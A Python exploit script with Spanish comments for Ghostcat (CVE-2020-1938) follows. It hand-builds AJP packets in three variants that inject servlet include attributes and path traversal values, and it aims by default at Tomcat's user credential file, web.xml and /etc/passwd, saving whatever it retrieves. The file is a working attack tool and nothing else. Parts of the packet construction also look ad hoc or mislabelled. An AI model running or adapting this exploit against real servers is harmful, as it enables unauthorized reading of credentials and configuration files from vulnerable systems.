#!/usr/bin/env python3
"""
Ghostcat CVE-2020-1938 - Versión mejorada
Soporta múltiples métodos de explotación
"""
import socket
import struct
import sys
import time

class AJPClient:
    def __init__(self, host, port=8009):
        self.host = host
        self.port = port
        self.sock = None
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"[-] Error de conexión: {e}")
            return False
    
    def close(self):
        if self.sock:
            self.sock.close()
    
    def send_raw(self, data):
        try:
            self.sock.send(data)
            time.sleep(1)
            response = b''
            while True:
                try:
                    chunk = self.sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 50000:
                        break
                except socket.timeout:
                    break
            return response
        except Exception as e:
            print(f"[-] Error enviando: {e}")
            return None
    
    def cpong_send(self):
        """Envía CPong para mantener viva la conexión"""
        self.sock.send(b'\x12\x34\x00\x01\x09')
    
    def cping(self):
        """Envía CPing y espera CPong"""
        if not self.connect():
            return False
        try:
            self.sock.send(b'\x12\x34\x00\x01\x0a')
            time.sleep(0.5)
            response = self.sock.recv(1024)
            if response and len(response) >= 5:
                if response[0:2] == b'\x41\x42' and response[4] == 0x09:
                    print("[+] AJP respondió a CPing - Servicio activo")
                    return True
            print("[-] No se recibió CPong, pero el puerto está abierto")
            return True
        except Exception as e:
            print(f"[-] Error CPing: {e}")
            return False
        finally:
            self.close()
    
    def forward_request(self, uri, method='GET', file_to_read=None):
        """Envía FORWARD_REQUEST con path traversal"""
        if not self.connect():
            return None
        
        # Construir el paquete FORWARD_REQUEST
        prefix_code = 0x02
        method_code = 0x02  # GET
        
        # Datos iniciales
        data = struct.pack('!BB', prefix_code, method_code)
        data += b'\x00\x01'  # HTTP/1.1
        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'  # host
        data += b'\x00\x00'  # address
        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'  # server_name
        data += struct.pack('!H', 443)  # server_port
        data += b'\x01'  # is_ssl (true)
        
        # Headers
        headers = {
            'host': self.host,
            'accept': '*/*',
            'user-agent': 'Mozilla/5.0',
            'connection': 'keep-alive'
        }
        data += struct.pack('!H', len(headers))
        
        for key, value in headers.items():
            key_bytes = key.encode()
            val_bytes = value.encode()
            data += struct.pack('!H', len(key_bytes)) + key_bytes + b'\x00'
            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
        
        # Atributos
        # request_uri (obligatorio)
        uri_bytes = uri.encode()
        data += b'\x0B'  # CODE = req_attribute
        attr_name = b'request_uri'
        data += struct.pack('!H', len(attr_name)) + attr_name
        data += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
        
        # PATH_INFO con path traversal (el ataque real)
        if file_to_read:
            # Método 1: javax.servlet.include.path_info
            attr_name = b'javax.servlet.include.path_info'
            val_bytes = file_to_read.encode()
            data += b'\x0B'
            data += struct.pack('!H', len(attr_name)) + attr_name
            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
            
            # Método 2: javax.servlet.include.servlet_path
            attr_name = b'javax.servlet.include.servlet_path'
            val_bytes = b'/'
            data += b'\x0B'
            data += struct.pack('!H', len(attr_name)) + attr_name
            data += struct.pack('!H', len(val_bytes)) + val_bytes + b'\x00'
        
        # Terminador
        data += b'\xFF'
        
        # Empaquetar con header AJP
        ajp_header = b'\x12\x34' + struct.pack('!H', len(data))
        full_packet = ajp_header + data
        
        print(f"[*] Enviando {len(full_packet)} bytes...")
        response = self.send_raw(full_packet)
        self.close()
        return response
    
    def method2_direct_file(self, file_path):
        """Método alternativo usando AJP con query string"""
        if not self.connect():
            return None
        
        # Construir request con file= en el URI
        uri = f"/manager/html?file=../{file_path}"
        
        prefix_code = 0x02
        method_code = 0x02
        
        data = struct.pack('!BB', prefix_code, method_code)
        data += b'\x00\x01'
        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'
        data += b'\x00\x00'
        data += struct.pack('!H', len(self.host)) + self.host.encode() + b'\x00'
        data += struct.pack('!H', 443)
        data += b'\x01'
        
        headers = {
            'host': self.host,
            'accept': '*/*'
        }
        data += struct.pack('!H', len(headers))
        for key, value in headers.items():
            data += struct.pack('!H', len(key)) + key.encode() + b'\x00'
            data += struct.pack('!H', len(value)) + value.encode() + b'\x00'
        
        # URI
        uri_bytes = uri.encode()
        data += b'\x0B'
        data += struct.pack('!H', 11) + b'request_uri'
        data += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
        
        # query_string
        qs = f"file=../{file_path}".encode()
        data += b'\x0B'
        data += struct.pack('!H', 12) + b'query_string'
        data += struct.pack('!H', len(qs)) + qs + b'\x00'
        
        data += b'\xFF'
        
        ajp_header = b'\x12\x34' + struct.pack('!H', len(data))
        response = self.send_raw(ajp_header + data)
        self.close()
        return response
    
    def method3_wire_format(self, file_path):
        """Método usando el formato binario exacto de AJPv13"""
        if not self.connect():
            return None
        
        file_bytes = file_path.encode()
        host_bytes = self.host.encode()
        
        # Construcción manual byte por byte
        packet = bytearray()
        
        # FORWARD_REQUEST
        packet.append(0x02)  # prefix_code
        packet.append(0x02)  # GET method
        
        # Protocol HTTP/1.1
        packet.append(0x00)
        packet.append(0x01)
        
        # Host (length-prefixed string)
        packet.append(0x00)
        packet.append(len(host_bytes))
        packet.extend(host_bytes)
        packet.append(0x00)  # null terminator
        
        # Address (empty)
        packet.append(0x00)
        packet.append(0x00)
        
        # Server name (empty)
        packet.append(0x00)
        packet.append(0x00)
        
        # Server port (443)
        packet.append(0x01)
        packet.append(0xBB)  # 443 en big-endian
        
        # is_ssl (true)
        packet.append(0x01)
        
        # 1 header
        packet.append(0x00)
        packet.append(0x01)
        
        # Header: host
        h_name = b'host'
        h_val = host_bytes
        packet.append(0x00)
        packet.append(len(h_name))
        packet.extend(h_name)
        packet.append(0x00)
        packet.append(0x00)
        packet.append(len(h_val))
        packet.extend(h_val)
        packet.append(0x00)
        
        # request_uri
        uri = b'/manager/html'
        packet.append(0x0B)
        packet.append(0x00)
        packet.append(11)
        packet.extend(b'request_uri')
        packet.append(0x00)
        packet.append(len(uri))
        packet.extend(uri)
        packet.append(0x00)
        
        # javax.servlet.include.path_info
        attr = b'javax.servlet.include.path_info'
        packet.append(0x0B)
        packet.append(0x00)
        packet.append(len(attr))
        packet.extend(attr)
        packet.append(0x00)
        packet.append(len(file_bytes))
        packet.extend(file_bytes)
        packet.append(0x00)
        
        # javax.servlet.include.servlet_path
        attr2 = b'javax.servlet.include.servlet_path'
        val2 = b'/'
        packet.append(0x0B)
        packet.append(0x00)
        packet.append(len(attr2))
        packet.extend(attr2)
        packet.append(0x00)
        packet.append(len(val2))
        packet.extend(val2)
        packet.append(0x00)
        
        # Terminator
        packet.append(0xFF)
        
        # AJP Header
        final = b'\x12\x34' + struct.pack('!H', len(packet)) + bytes(packet)
        
        response = self.send_raw(final)
        self.close()
        return response


def parse_response(data):
    """Extrae contenido útil de la respuesta AJP"""
    if not data or len(data) < 5:
        return None
    
    # Buscar AJP Response
    if data[0:2] == b'\x41\x42':
        data = data[4:]
    
    # Buscar SEND_BODY_CHUNK (0x03) o datos HTTP
    result = b''
    
    # Método 1: buscar chunks
    i = 0
    while i < len(data):
        if data[i] == 0x03:
            if i + 3 <= len(data):
                chunk_len = struct.unpack('!H', data[i+1:i+3])[0]
                start = i + 3
                end = start + chunk_len
                if end <= len(data):
                    result += data[start:end]
                    i = end + 1
                    continue
        i += 1
    
    # Método 2: buscar HTTP/ en los datos
    if not result:
        http_pos = data.find(b'HTTP/')
        if http_pos >= 0:
            result = data[http_pos:]
    
    if result:
        try:
            return result.decode('utf-8', errors='replace')
        except:
            return str(result)
    
    return None


def main():
    if len(sys.argv) < 2:
        print("Ghostcat CVE-2020-1938 - Versión Mejorada")
        print(f"Uso: {sys.argv[0]} <host> [archivo] [puerto]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 8009
    
    files = [
        "conf/tomcat-users.xml",
        "WEB-INF/web.xml", 
        "/etc/passwd",
        "index.html",
        "index.jsp"
    ]
    
    if len(sys.argv) > 2:
        files = [sys.argv[2]]
    
    client = AJPClient(host, port)
    
    # Verificar que el servicio responde
    print(f"[*] Verificando AJP en {host}:{port}...")
    if not client.cping():
        print("[!] El servicio podría no ser AJP o está filtrado")
    
    for file_path in files:
        print(f"\n{'='*50}")
        print(f"[*] Intentando leer: {file_path}")
        print(f"{'='*50}")
        
        # Probar los 3 métodos
        for method_num, method_func in enumerate([
            lambda: client.forward_request('/manager/html', file_to_read=file_path),
            lambda: client.method2_direct_file(file_path),
            lambda: client.method3_wire_format(file_path)
        ], 1):
            print(f"\n[*] Método {method_num}...")
            response = method_func()
            
            if response:
                print(f"[*] Respuesta: {len(response)} bytes")
                result = parse_response(response)
                if result and len(result) > 10:
                    print(f"[+] ¡EXITOSO! Contenido:\n")
                    print(result[:2000])
                    
                    # Guardar
                    safe_name = file_path.replace('/', '_').replace('.', '_')
                    with open(f'tmp/ghostcat_{safe_name}.txt', 'w') as f:
                        f.write(result)
                    print(f"\n[*] Guardado: tmp/ghostcat_{safe_name}.txt")
                    return
                else:
                    print(f"[-] Sin contenido extraíble")
                    print(f"[D] Raw: {response[:200]}")
            else:
                print(f"[-] Sin respuesta")
    
    print("\n[!] Todos los métodos fallaron")
    print("[*] Posibles razones:")
    print("    1. El AJP requiere secret (conf/server.xml)")
    print("    2. Tomcat tiene parche aplicado")
    print("    3. El puerto 8009 es otro servicio")
    print("    4. Firewall está bloqueando tráfico AJP")


if __name__ == "__main__":
    main()
